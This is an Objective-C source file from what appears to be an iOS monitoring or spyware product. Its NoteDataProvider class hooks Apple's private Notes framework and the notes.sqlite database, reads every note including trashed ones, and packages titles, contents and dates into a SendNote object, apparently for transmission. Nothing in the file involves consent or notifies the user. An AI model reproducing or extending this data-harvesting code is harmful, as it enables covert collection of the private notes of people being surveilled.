//
//  NoteDataProvider.m
//  NoteManager
//
//  Created by Ophat on 1/17/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NoteDataProvider.h"
#import "DateTimeFormat.h"

#import "Note.h"
#import "SendNote.h"		// in ProtocolBuilder

#import "NoteContext.h"
#import "NoteObject.h"

// iOS 9
#import "ICNoteContext.h"
#import "ICNote.h"
#import "TTTextStorage.h"

#import <CoreData/NSPersistentStoreCoordinator.h>
#import <objc/runtime.h>
#include <dlfcn.h>

@implementation NoteDataProvider

@synthesize mNoteContext;
@synthesize mNoteCount;
@synthesize mNoteIndex;

- (id) init {
	self = [super init];
	if (self != nil) {
        mNotesSharedHandle = dlopen("/System/Library/PrivateFrameworks/NotesShared.framework/NotesShared", RTLD_NOW);
	}
	return self;
}

- (BOOL) hasNext {
	DLog (@"hasnext index %ld (%d)", (long)mNoteIndex, (mNoteIndex < mNoteCount))
	return  (mNoteIndex < mNoteCount);
}

- (id) getObject {
	// 1. Create Note object
	// 2. Set all properties
	// 3. Return that Note object in step 1 as auto release
	DLog (@">>>>>> getObject");
	Note *note = nil;
	if (mNoteIndex < mNoteCount) {
        Class $ICNoteContext = objc_getClass("ICNoteContext");
        // Load note only the first time
        if (!mNoteObjects || mNoteIndex >= [mNoteObjects count]) {
            DLog(@"--- Initialize note object array")
            if ($ICNoteContext) {
                [$ICNoteContext startSharedContextWithOptions:34481];
                ICNoteContext *icNoteContext = [$ICNoteContext sharedContext];
                
                //ICNoteContext *icNoteContext = [(ICNoteContext *)[$ICNoteContext alloc] initWithOptions:34481]; // Magic number from hooking
                //mNoteObjects = [[NSArray arrayWithArray:[icNoteContext visibleNotes]] retain];
                //[icNoteContext release];
                
                id predicate = [icNoteContext predicateForVisibleNotesIncludingTrash:YES];
                mNoteObjects = [[NSArray arrayWithArray:[icNoteContext notesMatchingPredicate:predicate]] retain];
            } else {
                mNoteObjects = [[NSArray arrayWithArray:[[self mNoteContext] allVisibleNotes]] retain];
            }
        }
        
        // Get each note from the array
        if (mNoteIndex < [mNoteObjects count]) {
            DLog(@"--- get note at index %ld from count %lu", (long)mNoteIndex, (unsigned long)[mNoteObjects count])
            
            if ($ICNoteContext) {
                // iOS 9
                ICNote *noteObject = [mNoteObjects objectAtIndex:mNoteIndex];
                DLog (@"Note title >>>> %@",        [noteObject title] )
                DLog (@"Note content plain >> %@",  [[noteObject textStorage] string])
                
                note = [[Note alloc] init];
                [note setMAppId:kAppIdNative];
                [note setMNoteId:[[noteObject uuid] UUIDString]];
                [note setMTitle:[noteObject title]];
                [note setMContent:[[noteObject textStorage] string]];
                [note setMCreationDateTime:[DateTimeFormat phoenixDateTime:[noteObject creationDate]]];
                [note setMLastModifiedDateTime:[DateTimeFormat phoenixDateTime:[noteObject modificationDate]]];
                [note autorelease];
            } else {
                NoteObject *noteObject = [mNoteObjects objectAtIndex:mNoteIndex];
                
                DLog (@"Note title >>>> %@",        [noteObject title] )
                DLog (@"Note content plain >> %@",  [noteObject contentAsPlainText])
                
                note = [[Note alloc] init];
                [note setMAppId:kAppIdNative];
                [note setMNoteId:[[noteObject noteId] absoluteString]];
                [note setMTitle:[noteObject title]];
                [note setMContent:[noteObject contentAsPlainText]];
                [note setMCreationDateTime:[DateTimeFormat phoenixDateTime:[noteObject creationDate]]];
                [note setMLastModifiedDateTime:[DateTimeFormat phoenixDateTime:[noteObject modificationDate]]];
                [note autorelease];
            }
        } else {
            DLog(@"Invalid index of note array")
        }
        
		mNoteIndex++;
	} else {
		DLog (@" Invalid index of Note");
	}
	
	return (note);
}

- (id) commandData {
	if (mNoteObjects) {
        DLog(@"Clear note object array")
        [mNoteObjects release];
        mNoteObjects = nil;
    }
	[self setMNoteContext:nil];
	
    NoteContext *noteContext			= [[NoteContext alloc] init];
	NSURL *url							= [NSURL URLWithString:@"file://localhost/var/mobile/Library/Notes/notes.sqlite"];
	NSPersistentStoreCoordinator *psc	= [noteContext persistentStoreCoordinator];
	[psc persistentStoreForURL:url];
	[psc setURL:url forPersistentStore:[[psc persistentStores] objectAtIndex:0]];
    
    NSInteger notesCount = 0;
    Class $ICNoteContext = objc_getClass("ICNoteContext");
    if ($ICNoteContext) {
        [$ICNoteContext startSharedContextWithOptions:34481];
        ICNoteContext *icNoteContext = [$ICNoteContext sharedContext];
        DLog(@"Notes shared context, %@", icNoteContext);
        
        //ICNoteContext *icNoteContext = [(ICNoteContext *)[$ICNoteContext alloc] initWithOptions:34481]; // Magic number from hooking
        //notesCount = [[icNoteContext visibleNotes] count];
        //[icNoteContext release];
        
        id predicate = [icNoteContext predicateForVisibleNotesIncludingTrash:YES];
        notesCount = [[icNoteContext notesMatchingPredicate:predicate] count];
        DLog(@"Notes predicate, %@", predicate);
    } else {
        notesCount = [[noteContext allVisibleNotes]count];
    }
	
	[self setMNoteIndex:0];
	[self setMNoteCount:notesCount];
    DLog(@"Note Count %ld", (long)[self mNoteCount])
	SendNote* sendNote = [[SendNote alloc] init];
	[sendNote setMNoteCount:[self mNoteCount]];
	[sendNote setMNoteDataProvider:self];
	[sendNote autorelease];
    
    [self setMNoteContext:noteContext];
    
	return (sendNote);
}

- (void) dealloc {
    if (mNoteObjects) {
        [mNoteObjects release];
    }
    
	[self setMNoteContext:nil];
    
    if (mNotesSharedHandle) {
        dlclose(mNotesSharedHandle);
        mNotesSharedHandle = nil;
    }
	[super dealloc];
}


@end
